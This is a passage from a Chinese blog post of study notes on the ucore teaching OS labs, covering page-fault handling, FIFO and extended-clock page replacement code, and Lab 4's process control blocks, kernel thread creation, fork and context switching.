将该物理页与对应的虚拟地址关联，同时设置页表。</span><br>            page_insert(mm-&gt;pgdir, page, addr, perm);<br>            <span class="hljs-comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span><br>            swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>            page-&gt;pra_vaddr = addr;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>关于<code>get_pte() and page_remove_pte() vs. page_inseret()</code>回顾: <ul><li>get pte and return the kernel virtual address of this pte for la, and if the PT contianing this pte didn’t exist, alloc a page for PT</li><li>page的插入和删除意味着page结构的ref增减以及pte的存在与否, 而实验为了弄出一个练习, 在<code>page_remove()</code>中判断pte不为空后调用<code>page_remove_pte()</code>, ref_dec and clear pte.</li></ul></li></ul><hr><ul><li>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中组成部分对ucore实现页替换算法的潜在用处。<ul><li>即PTE结构与其标志位用途</li></ul></li><li>如果ucore的缺页服务例程在执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？<ul><li>将发生错误的线性地址（虚拟地址）保存至CR2寄存器中。</li><li>压入<code>EFLAGS</code>，<code>CS</code>, <code>EIP</code>，错误码和中断号至当前内核栈中。</li><li>保存上下文。</li><li>执行新的缺页中断程序。</li><li>恢复上下文。</li><li>继续执行<strong>上一级</strong>的缺页服务例程。</li></ul></li></ul><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p><strong>补充完成基于FIFO的页面替换算法</strong></p><p>完成vmm.c中的do_pgfault函数，并且在实现FIFO算法的swap_fifo.c中完成map_swappable和swap_out_victim函数。</p></blockquote><ul><li><p><code>FIFO</code>中，当新加入一个物理页时，我们只需将该物理页加入至链表首部即可。当需要换出某个物理页时，选择链表末尾的物理页即可。</p></li><li><p>相关实现如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_map_swappable(struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page   *page, <span class="hljs-keyword">int</span> swap_in)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>    <span class="hljs-keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);<br><br>    assert(entry != <span class="hljs-literal">NULL</span> &amp;&amp; head != <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//record the page access situlation</span><br>    <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>    <span class="hljs-comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span><br>    list_add_before(head, entry);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>     <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>         assert(head != <span class="hljs-literal">NULL</span>);<br>     assert(in_tick==<span class="hljs-number">0</span>);<br>     <span class="hljs-comment">/* Select the victim */</span><br>     <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>     <span class="hljs-comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span><br>     <span class="hljs-comment">//(2)  assign the value of *ptr_page to the addr of this page</span><br>     <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;prev;<br>     assert(head!=le);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> le2page(le, pra_page_link);<br>     list_del(le);<br>     assert(p !=<span class="hljs-literal">NULL</span>);<br>     *ptr_page = p;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>如果要在ucore上实现”extended clock页替换算法”请给你的设计方案，现有的swap_manager框架是否足以支持在ucore中实现此算法？如果是，请给你的设计方案。如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题</p><ul><li>现有的swap_manager框架可以支持在ucore中实现此算法，具体见<strong>扩展练习1</strong>。</li><li>需要被换出的页的特征是什么？<ul><li><code>PTE_P</code>(Present)和<code>PTE_D</code>(Dirty)位均为0。</li></ul></li><li>在ucore中如何判断具有这样特征的页？<ul><li>获取线性地址所对应的页表项，之后使用位运算判断<code>PTE_P</code>和<code>PTE_D</code>。</li></ul></li><li>何时进行换入和换出操作？<ul><li>缺页时换入。</li><li>物理页帧满时换出，不过需要注意dirty bit的处理。可以在修改dirty的时候写入外存，或者可以在最终要删除该物理页时再写入外存。后者有利于多个写操作的合并，降低缺页代价，但此时的页替换算法却退化成普通的clock算法，而不是extended clock算法了。</li></ul></li></ul></li></ul><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><ul><li><p>需要注意的是extended clock算法会修改dirty bit, 但是swap.c中的swap_out()函数直接把<code>_fifo_swap_out_victim()</code>通过参数返回的page写入到磁盘swap分区中, <strong>根本不管有没有修改过</strong>, 或许可以改进</p></li><li><p>改进的时钟算法会修改dirty bit的原因可能是让被修改过的页面停留在内存中的时间更长, 因为要经过更多次的遍历才能被置换出</p></li><li><p>我寻思把PTE_D and PTE_A结合起来遍历到了就减一也没啥特别的, 而且下一次进入错误处理例程指针还是按照上次的接着继续(如果严格按照PPT上的话), 按别人的做法还要遍历三次当前swappable的页面, 遍历一次记录第一次遇到的00,10,11不就成了, 减少一点微不足道的写回时间(好像没有</p></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_extend_clock_swap_out_victim(struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head = (<span class="hljs-keyword">list_entry_t</span> *)mm-&gt;sm_priv;<br>    assert(head != <span class="hljs-literal">NULL</span>);<br>    assert(in_tick == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//在head双向链表中从头开始遍历, 两个数字代表PTE_A PTE_D组成两位的样子</span><br>    <span class="hljs-comment">//用三个指针取第一次遍历到的page, 00优先级最高</span><br>    <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;next, *_00 = <span class="hljs-literal">NULL</span>, *_10 = <span class="hljs-literal">NULL</span>, *_11 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (le != head)<br>    &#123;<span class="hljs-comment">//只需遍历一次</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> le2page(le, pra_page_link); <span class="hljs-comment">//字面意思</span><br><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, page-&gt;pra_vaddr, <span class="hljs-number">0</span>);<br>        assert(ptep != <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//写着意思一下, 也不知有啥用</span><br>        <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_A))<br>        &#123;<span class="hljs-comment">//遇到第一个00就可以直接break了, 受害者就是你!</span><br>            _00 = le;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-comment">//剩下两种情况不能break(为了不写的更复杂</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_D) &amp;&amp; _10 == <span class="hljs-literal">NULL</span>)<br>            _10 = le;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_11 == <span class="hljs-literal">NULL</span>)<br>            _11 = le;<br>        le = le-&gt;next;<br>    &#125;<br>    le = _00 != <span class="hljs-literal">NULL</span> ? _00 : (_10 != <span class="hljs-literal">NULL</span> ? _10 : _11);<span class="hljs-comment">//根据优先级选一个不为零的</span><br>    *ptr_page = le2page(le, pra_page_link);<span class="hljs-comment">//把受害者的page赋值给这东西</span><br>    list_del(le);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>成了, 简化了一下没有什么用的改进时钟算法, 只要一次甚至不用完全的一次遍历即可做到相同效果, 还通过了fifo的检查, 有这么巧吗</p><blockquote><p>想了一下, 我这快简化成FIFO了, 而改进的时钟置换算法的优势在于<strong>相近的</strong>多次遍历之中, 被写过的页面可以在内存中驻留更久的时间</p><p>坑不填了, 问题就是这个意思没有很复杂</p></blockquote><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><p>暂时不写</p><h1 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成-1"><a href="#0-项目组成-1" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验三，实验四中主要改动如下：</p><ul><li>kern/process/ （新增进程管理相关文件）<ul><li>proc.[ch]：新增：实现进程、线程相关功能，包括：创建进程/线程，初始化进程/线程，处理进程/线程退出等功能</li><li>entry.S：新增：内核线程入口函数kernel_thread_entry的实现</li><li>switch.S：新增：上下文切换，利用堆栈保存、恢复进程上下文</li></ul></li><li>kern/init/<ul><li>init.c：修改：完成进程系统初始化，并在内核初始化后切入idle进程</li></ul></li><li>kern/mm/ （基本上与本次实验没有太直接的联系，了解kmalloc和kfree如何使用即可）<ul><li>kmalloc.[ch]：新增：定义和实现了新的kmalloc/kfree函数。具体实现是基于slab分配的简化算法 （只要求会调用这两个函数即可）</li><li>memlayout.h：增加slab物理内存分配相关的定义与宏 （可不用理会）。</li><li>pmm.[ch]：修改：在pmm.c中添加了调用kmalloc_init函数,取消了老的kmalloc/kfree的实现；在pmm.h中取消了老的kmalloc/kfree的定义</li><li>swap.c：修改：取消了用于check的Line 185的执行</li><li>vmm.c：修改：调用新的kmalloc/kfree</li></ul></li><li>kern/trap/<ul><li>trapentry.S：增加了汇编写的函数forkrets，用于do_fork调用的返回处理。</li></ul></li><li>kern/schedule/<ul><li>sched.[ch]：新增：实现FIFO策略的进程调度</li></ul></li><li>kern/libs<ul><li>rb_tree.[ch]：新增：实现红黑树，被slab分配的简化算法使用（可不用理会）</li></ul></li></ul><h3 id="1-重要数据结构-link"><a href="#1-重要数据结构-link" class="headerlink" title="1.重要数据结构[link]"></a>1.重要数据结构<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_2_pcb.html">[link]</a></h3><blockquote><p>这次的<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_1_lab_steps.html">实验指导书</a>真绝, 写的是没法比那个好了, 就写点自己领悟到的流程吧</p></blockquote><p>为了管理系统中所有的进程控制块，uCore维护了如下全局变量（位于<em>kern/process/proc.c</em>）：</p><ul><li><code>static struct proc *current</code>：当前占用CPU且处于“运行”状态进程控制块指针。通常这个变量是只读的，只有在进程切换的时候才进行修改，并且整个切换和修改过程需要保证操作的原子性，目前至少需要屏蔽中断。可以参考 switch_to 的实现。</li><li><code>static struct proc *initproc</code>：本实验中，指向一个内核线程。本实验以后，此指针将指向第一个用户态进程。</li><li><code>static list_entry_t hash_list[HASH_LIST_SIZE]</code>：所有进程控制块的哈希表，proc_struct中的成员变量hash_link将基于pid链接入这个哈希表中。</li><li><code>list_entry_t proc_list</code>：所有进程控制块的双向线性列表，proc_struct中的成员变量list_link将链接入这个链表中。</li></ul><p>PCB好像有所简化:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> &#123;</span><br>    PROC_UNINIT = <span class="hljs-number">0</span>,  <span class="hljs-comment">// 未初始化的     -- alloc_proc</span><br>    PROC_SLEEPING,    <span class="hljs-comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span><br>    PROC_RUNNABLE,    <span class="hljs-comment">// 就绪/运行状态   -- proc_init, wakeup_proc,</span><br>    PROC_ZOMBIE,      <span class="hljs-comment">// 僵死状态       -- do_exit</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> &#123;</span>  <span class="hljs-comment">// 保存的上下文寄存器，注意没有eax寄存器和段寄存器</span><br>    <span class="hljs-keyword">uint32_t</span> eip;<br>    <span class="hljs-keyword">uint32_t</span> esp;<br>    <span class="hljs-keyword">uint32_t</span> ebx;<br>    <span class="hljs-keyword">uint32_t</span> ecx;<br>    <span class="hljs-keyword">uint32_t</span> edx;<br>    <span class="hljs-keyword">uint32_t</span> esi;<br>    <span class="hljs-keyword">uint32_t</span> edi;<br>    <span class="hljs-keyword">uint32_t</span> ebp;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> <span class="hljs-title">state</span>;</span>          <span class="hljs-comment">// 当前进程的状态</span><br>    <span class="hljs-keyword">int</span> pid;                        <span class="hljs-comment">// 进程ID</span><br>    <span class="hljs-keyword">int</span> runs;                       <span class="hljs-comment">// 当前进程被调度的次数</span><br>    <span class="hljs-keyword">uintptr_t</span> kstack;               <span class="hljs-comment">// 内核栈</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">bool</span> need_resched;     <span class="hljs-comment">// 是否需要被调度</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">parent</span>;</span>     <span class="hljs-comment">// 父进程ID</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span>           <span class="hljs-comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>         <span class="hljs-comment">// 保存的上下文</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span>;</span>           <span class="hljs-comment">// 中断所保存的上下文</span><br>    <span class="hljs-keyword">uintptr_t</span> cr3;                  <span class="hljs-comment">// 页目录表的地址</span><br>    <span class="hljs-keyword">uint32_t</span> flags;                 <span class="hljs-comment">// 当前进程的相关标志</span><br>    <span class="hljs-keyword">char</span> name[PROC_NAME_LEN + <span class="hljs-number">1</span>];   <span class="hljs-comment">// 进程名称（可执行文件名）</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;         <span class="hljs-comment">// 用于连接list</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;         <span class="hljs-comment">// 用于连接hash list</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h3><ul><li>首先肯定是<code>proc_init()</code>:</li></ul><p><img src="../../image/ucore/image-20211224212029857.png" alt="image-20211224212029857"></p><ul><li><p>首先初始化一下<code>proc_list</code>和<code>hash_list</code>, 然后调用<code>alloc_proc()</code>来通过<code>kmalloc()</code>获取一个proc_struct的空间, 以及略微初始化一下第0个内核线程idleproc(指把状态设成PROC_UNINIT, pid设成-1等等)</p></li><li><p>接着真正初始化一下各个字段的值, 其中kstack直接设置成内核栈bootstack(前面给过出处, 内核栈总共8KB), 弄成current</p></li><li><p>接着调用kern_thread来创建第1个内核线程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kernel_thread(<span class="hljs-keyword">int</span> (*fn)(<span class="hljs-keyword">void</span> *), <span class="hljs-keyword">void</span> *arg, <span class="hljs-keyword">uint32_t</span> clone_flags)<br>&#123;<span class="hljs-comment">//三个参数为init_main, &quot;Hello World!&quot;, 0</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> <span class="hljs-title">tf</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf.tf_cs = KERNEL_CS;<br>    tf.tf_ds = tf_struct.tf_es = tf_struct.tf_ss = KERNEL_DS;<br>    tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)fn;<br>    tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>)arg;<br>    tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>    <span class="hljs-keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="hljs-number">0</span>, &amp;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>用局部变量在栈上保存trapframe, 全部设置成内核的段和栈</li><li>注意eip, 设置成了四行汇编的入口及退出代码, 效果相当于c语言main函数之前的准备函数</li><li>随后调用do_fork()进行线程的创建(主要根据trapframe)</li></ul></li><li><p>kern_thread中的do_fork()</p><ul><li><p>分配并初始化进程控制块（alloc_proc函数）</p></li><li><p>分配并初始化内核栈（setup_stack函数）,调用alloc_pages()分配2个(即<code>KSTACKPAGE</code>)page</p></li><li><p>根据clone_flag标志复制或共享进程内存管理结构（copy_mm函数）</p></li><li><p>设置进程在内核（将来也包括用户态）正常运行和调度所需的trapframe和执行context (<strong>copy_thread</strong>函数)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">copy_thread</span><span class="hljs-params">(struct proc_struct *proc, <span class="hljs-keyword">uintptr_t</span> esp, struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">//在内核堆栈的顶部设置中断帧大小的一块栈空间</span><br>    <span class="hljs-comment">//这个减一就很灵性, 因为tf在栈上占据了空间, 所以栈指针下移</span><br>    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="hljs-number">1</span>;<br>    *(proc-&gt;tf) = *tf; <span class="hljs-comment">//拷贝在kernel_thread函数建立的临时中断帧的初始值</span><br>    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="hljs-number">0</span>;<span class="hljs-comment">//设置子进程/线程执行完do_fork后的返回值</span><br>    proc-&gt;tf-&gt;tf_esp = esp; <span class="hljs-comment">//设置中断帧中的栈指针esp,因为我们复制了内存,直接使用父进程esp即可</span><br>    proc-&gt;tf-&gt;tf_eflags |= FL_IF; <span class="hljs-comment">//使能中断</span><br>    <br>    proc-&gt;context.eip = (<span class="hljs-keyword">uintptr_t</span>)forkret;<span class="hljs-comment">//由调度器中的switch_to把这个push到栈上再ret来恢复执行</span><br>    <span class="hljs-comment">//这个proc-&gt;tf和esp有什么关系? 其实fork执行完后子进程仍然处于内核中中断处理例程的状态(由context决定)</span><br>    <span class="hljs-comment">//如果父进程刚好有一个wait, 那么就会调度子进程执行, 也就是执行fork_ret从中断退出以继续执行用户进程</span><br>    proc-&gt;context.esp = (<span class="hljs-keyword">uintptr_t</span>)(proc-&gt;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>把设置好的进程控制块放入hash_list和proc_list两个全局进程链表中</p></li><li><p>自此，进程已经准备好执行了，把进程状态设置为“就绪”态；</p></li><li><p>设置返回码为子进程的id号。</p></li><li><p>此时可知init_proc的中断帧如下所示, 控制块记录着该线程的一切必要信息, 在内核态设置好了内核栈以及其上的trapframe, 如果是用户程序(应该在下一个实验中)只需执行一下中断返回的流程即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//所在地址位置</span><br>initproc-&gt;tf= (proc-&gt;kstack+KSTACKSIZE) – <span class="hljs-keyword">sizeof</span> (struct trapframe);<br><span class="hljs-comment">//具体内容</span><br>initproc-&gt;tf.tf_cs = KERNEL_CS;<br>initproc-&gt;tf.tf_ds = initproc-&gt;tf.tf_es = initproc-&gt;tf.tf_ss = KERNEL_DS;<br>initproc-&gt;tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)init_main;<br>initproc-&gt;tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>) ADDRESS of <span class="hljs-string">&quot;Helloworld!!&quot;</span>;<br>initproc-&gt;tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>initproc-&gt;tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;<br>initproc-&gt;tf.tf_esp = esp;<br>initproc-&gt;tf.tf_eflags |= FL_IF;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>然后从kern_init()中永真循环的cpu_idle进入调度函数<strong>schedule</strong>(), 是很简单的FIFO, 注意要保证调度操作的atomicity, 即屏蔽中断, IF置零</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// cpu_idle - at the end of kern_init, the first kernel thread idleproc will do below works</span><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cpu_idle</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>      <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>              schedule();<br>          &#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p><img src="../../image/ucore/image-20211224232536016.png" alt="image-20211224232536016"></p><ol><li>设置当前内核线程current-&gt;need_resched为0； <strong>(?</strong> </li><li>在proc_list队列中查找下一个处于“就绪”态的线程或进程<code>next</code>； </li><li>找到这样的进程后，就调用proc_run函数，保存当前进程current的执行现场（进程上下文），恢复新进程的执行现场，完成进程切换。</li></ol></li><li><p>proc_run比较重要:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">proc_run</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (proc != current) &#123;<br>        <span class="hljs-keyword">bool</span> intr_flag;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">prev</span> =</span> current, *next = proc;<br>        local_intr_save(intr_flag); <br>        &#123;<br>            current = proc;<br>            load_esp0(next-&gt;kstack + KSTACKSIZE);  <span class="hljs-comment">//在TSS中的ring0栈顶指针</span><br>            lcr3(next-&gt;cr3);<span class="hljs-comment">//这实际上是完成进程间的页表切换；</span><br>            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));<br>        &#125;<br>        local_intr_restore(intr_flag);<br>&#125;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>switch()比较特别,因为两个参数都是在内存中,然而并不能从内存直接读取到内存, 只能通过一段汇编来把prev的context通过%eax做媒介存入相应寄存器中, 这样context就建立完成了, 注意到eip被设置成forkrets, 就是在trap.S里的一段汇编, 而且重用了以前的代码</li><li><strong>调度完成后先执行forkret, 从栈上弹出entry的地址(和ebp等一起包含在tf中), 然后再执行用户的主函数fn(在这里是initmain)</strong> </li></ul></li><li><p>随后<strong>进程执行完毕后</strong>就返回到kernel_tread_entry函数，并进一步调用<strong>do_exit</strong>执行退出操作了。本来do_exit应该完成一些资源回收工作等，但这些不是实验四涉及的，而是由后续的实验来完成。</p></li></ul><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-1"><a href="#练习1-1" class="headerlink" title="练习1"></a>练习1</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">alloc_proc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>    <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(proc, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>        proc-&gt;state = PROC_UNINIT;<br>        proc-&gt;pid = <span class="hljs-number">-1</span>;<br>        proc-&gt;cr3 = boot_cr3;<br>    &#125;<br>    <span class="hljs-keyword">return</span> proc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>请说明proc_struct中<code>struct context context</code>和<code>struct trapframe 